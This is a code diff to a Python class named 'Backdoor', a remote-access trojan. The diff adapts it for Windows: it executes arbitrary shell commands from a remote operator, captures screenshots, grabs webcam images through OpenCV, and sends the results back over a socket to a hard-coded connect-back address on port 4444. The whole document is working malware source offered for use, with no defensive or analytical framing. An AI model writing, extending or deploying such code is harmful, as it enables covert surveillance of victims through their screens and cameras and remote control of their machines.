@@ -2,8 +2,11 @@ import socket, json
 import subprocess
 import os
 import base64
+# os.system("python -m pip install --upgrade pip")
 # os.system("pip3 install mss")
 # os.system("pip3 install pygame")
+# os.system("pip3 install numpy")
+# os.system("pip install opencv-python")
 import mss
 import pygame
 import pygame.camera
@@ -29,9 +32,9 @@ class Backdoor:
     
     def execute_system_command(self, command):
         try:
-            return subprocess.check_output(command, shell=True).decode("utf-8")
-        except:
-            return "sometext"
+            return subprocess.getoutput(command) #.decode("utf-8")
+        except Exception as error:
+            return error
 
     def change_working_directory_to(self, path):
         try:
@@ -70,26 +73,26 @@ class Backdoor:
                 elif command.split()[0] == "screenshot":
                     im = mss.mss().shot(output="screen.png")
                     command_result = self.read_file("screen.png")
-                    os.system("rm screen.png")
+                    os.system("del screen.png")
                     # "[+] Done! You get see it as screen.png"
                 elif command.split()[0] == "camera":
-                    pygame.camera.init()
-                    pygame.camera.list_cameras() #Camera detected or not
-                    cam = pygame.camera.Camera("/dev/video0",(640,480))
-                    cam.start()
-                    img = cam.get_image()
-                    pygame.image.save(img,"camera.jpg")
-                    cam.stop()
+                    cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
+                    result, image = cam.read()
+                    if result:
+                         cv2.imwrite("camera.jpg", image)
+                    else:
+                         print("No image detected. Please! try again")
                     command_result = self.read_file("camera.jpg")
-                    os.system("rm camera.jpg")
+                    os.system("del camera.jpg")
                 else:
-                    command_result = self.execute_system_command(command)                                      
+                    command_result = self.execute_system_command(command)                                   
                 self.reliable_send(command_result)
-            except:
-                self.reliable_send("[-] Something was wrong!")
+            except Exception as error:
+                self.reliable_send(error)
+                # self.reliable_send("[-] Something was wrong!")
 
 
-my_backdoor = Backdoor("192.168.0.101", 4444)
+my_backdoor = Backdoor("localhost", 4444)
 my_backdoor.run()
 
 
